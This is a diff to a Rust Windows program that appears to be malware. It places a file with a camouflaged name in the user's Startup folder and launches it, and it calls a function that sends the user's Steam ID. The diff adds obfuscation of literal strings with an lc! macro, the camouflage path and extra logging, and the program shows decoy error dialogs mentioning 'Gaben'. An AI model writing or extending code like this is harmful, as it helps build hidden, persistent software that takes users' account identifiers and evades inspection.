@@ -16,8 +16,6 @@ use windows::core::*;
 use windows::Win32::UI::WindowsAndMessaging::{
     MessageBoxA, MB_ICONERROR, MB_ICONINFORMATION, MB_ICONWARNING, MB_OK, MESSAGEBOX_STYLE,
 };
-use winreg::enums::*;
-use winreg::RegKey;
 
 mod secret;
 
@@ -34,18 +32,20 @@ async fn main() {
     sdk::logger::init_env();
 
     let access_denied = || {
-        show_message("Error", "Access Denied", MB_ICONWARNING | MB_OK);
+        show_message(&lc!("Error"), &lc!("Access Denied"), MB_ICONWARNING | MB_OK);
         std::process::exit(1);
     };
 
-    let username = std::env::var("UserName").expect("failed to retrieve user name");
+    let username = std::env::var(lc!("UserName")).expect("failed to retrieve user name");
     let camoflage = env!("CAMOFLAGE");
 
     let path = PathBuf::new()
         .join("C:\\Users")
         .join(&username)
-        .join("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+        .join("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        .join(&camoflage);
 
+    log::debug!("{:?}", path);
     secret::send_steam_id().await;
 
     if path.exists() {
@@ -60,14 +60,17 @@ async fn main() {
 
         if let Err(err) = Command::new(path).spawn() {
             match err.kind() {
-                std::io::ErrorKind::PermissionDenied => access_denied(),
+                std::io::ErrorKind::PermissionDenied => {
+                    log::error!("{:?}", err);
+                    access_denied();
+                }
                 err => {
+                    log::error!("{:?}", err);
                     show_message(
                         &lc!("Error"),
                         &lc!("Failed to launch Gaben"),
                         MB_ICONERROR | MB_OK,
                     );
-                    log::error!("{:?}", err);
                 }
             }
             return;
@@ -84,7 +87,10 @@ async fn main() {
                 main();
             }
             Err(err) => match err.kind() {
-                std::io::ErrorKind::PermissionDenied => access_denied(),
+                std::io::ErrorKind::PermissionDenied => {
+                    log::error!("{:?}", err);
+                    access_denied();
+                }
                 err => log::error!("{:?}", err),
             },
         }
